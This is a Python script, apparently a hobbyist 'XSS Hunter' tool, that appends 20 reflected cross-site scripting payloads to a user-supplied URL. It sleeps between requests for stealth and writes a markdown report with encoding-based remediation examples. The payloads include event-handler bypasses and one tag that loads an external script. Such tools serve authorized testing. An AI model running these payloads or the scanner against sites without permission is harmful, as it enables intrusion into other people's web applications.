import requests
import time
import os
from datetime import datetime

def gerar_relatorio_xss(alvo, payload, tipo_xss):
    """Gera um arquivo .md formatado para XSS com remediação técnica."""
    data_atual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not os.path.exists("reports"):
        os.makedirs("reports")
        
    nome_arquivo = f"reports/Report_XSS_{int(time.time())}.md"
    
    # Dicionário de Correções Técnicas para XSS
    remediacoes = {
        "PHP": "```php\necho htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n```",
        "Python_Flask": "```python\n# O Jinja2 já faz auto-escape, mas se usar manual:\nfrom markupsafe import escape\nreturn escape(user_input)\n```",
        "JavaScript": "```javascript\n// Use textContent em vez de innerHTML\nelement.textContent = userInput;\n```",
        "Java_Spring": "```java\n// Use bibliotecas como OWASP Java HTML Sanitizer\nPolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);\nString safeHTML = policy.sanitize(untrustedHTML);\n```"
    }

    conteudo = f"""# Relatório de Vulnerabilidade: {tipo_xss}

## 🛡️ Resumo
Vulnerabilidade de Cross-Site Scripting (XSS) confirmada. O aplicativo falha em sanitizar ou codificar corretamente a entrada do usuário antes de renderizá-la na página, permitindo a execução de scripts maliciosos no navegador da vítima.

**Alvo:** {alvo}
**Data do Teste:** {data_atual}
**Payload Utilizado:** `{payload}`
**Impacto:** Execução de scripts arbitrários (JavaScript), podendo levar ao roubo de cookies de sessão (Session Hijacking), redirecionamentos maliciosos ou desfiguração da página (Defacement).

## 🛠️ Remediação Técnica
A principal defesa contra XSS é a **Codificação de Saída (Output Encoding)** e a **Sanitização de HTML**.

### Exemplos de Implementação Correta:

#### PHP
{remediacoes['PHP']}

#### Python (Flask/Django)
{remediacoes['Python_Flask']}

#### Node.js / Vanilla JS
{remediacoes['JavaScript']}

#### Java
{remediacoes['Java_Spring']}

---
*Gerado automaticamente por XSS Hunter - Willian de Oliveira.*
"""
    with open(nome_arquivo, "w", encoding="utf-8") as f:
        f.write(conteudo)
    
    print(f"\n[+] Relatório de XSS gerado: {nome_arquivo}")
    return nome_arquivo

def xss_scanner_furtivo():
    print("""
============================================================
       XSS HUNTER - Cibersegurança Essencial
       Desenvolvido por Willian de Oliveira 
       Certificado em Ciberseguranca pela IBSEC
============================================================
    """)
    
    target = input("🎯 URL Alvo (ex: http://site.com/busca?q=): ")
    
    # OS 20 PAYLOADS PARA BYPASS E PERFORMANCE
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<video><source onerror=\"alert(1)\">",
        "<marquee onstart=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<details/open/ontoggle=\"alert`1`\">",
        "<d3\" onmouseover=\"alert(1)\">XSS",
        "<a href=\"javascript:alert(1)\">ClickMe</a>",
        "<script>confirm(document.domain)</script>",
        "<img src=x onerror=prompt(1)>",
        "<script src=https://base.com/x.js></script>",
        "'-alert(1)-'"
    ]

    for i, p in enumerate(payloads):
        print(f"[*] [{i+1}/20] Testando payload: {p}")
        try:
            # Simulando o teste via parâmetro GET
            # Nota: Em cenários reais, o scanner verifica se o payload foi refletido no HTML
            res = requests.get(target + p, timeout=10)
            
            # Lógica de detecção: o payload apareceu no código fonte da resposta?
            if p in res.text:
                print(f"💰 SUCESSO! Payload refletido na página.")
                gerar_relatorio_xss(target, p, "Cross-Site Scripting (Reflected)")
                break
        except:
            print("⚠️ Erro de conexão.")

        if i < len(payloads) - 1:
            print("⏳ Aguardando 60 segundos (Furtividade)...")
            time.sleep(60)

if __name__ == "__main__":
    xss_scanner_furtivo()
